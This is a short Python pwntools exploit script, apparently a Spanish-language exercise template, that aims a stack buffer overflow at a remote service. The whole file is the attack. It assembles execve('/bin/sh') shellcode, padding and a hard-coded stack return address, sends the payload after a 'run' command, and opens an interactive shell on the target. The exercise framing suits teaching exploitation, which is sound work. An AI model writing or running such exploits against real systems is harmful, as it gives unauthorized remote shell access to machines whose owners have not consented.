from pwn import *
import sys
import time

if len(sys.argv) < 3:
    print("Usage: exploit.py ip port")
    sys.exit(0)

buf = b'' #Completa el payload!
buf += b"\xfc\x93\x9e\x98\xfd\x92\x91\xfc\xfd\x91\x90\xf9\x9e"
buf += b"\x9f\x9f\x98\x92\xfd\x98\x91\x48\xb8\x2f\x62\x69\x6e"
buf += b"\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63"
buf += b"\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"
buf += b'A'*80
buf += b'B'*6
buf += b'\x00\x00'
buf += p64(0x7fffffffe810) #Dirección del shellcode

print("Connecting to {} on port {}".format(sys.argv[1], sys.argv[2]))
conn = remote(sys.argv[1],int(sys.argv[2]))
conn.recvline()
conn.recvuntil(b':', drop=True)
conn.sendline(b'run') # En que comando está la vulnerabilidad? modifica esta linea
time.sleep(1) #Esto es importante! si no los dos send se mezclan
conn.sendline(buf)
time.sleep(1) 
conn.interactive() #Si tu exploit hace execve(/bin/bash), si es un shell remoto no hace falta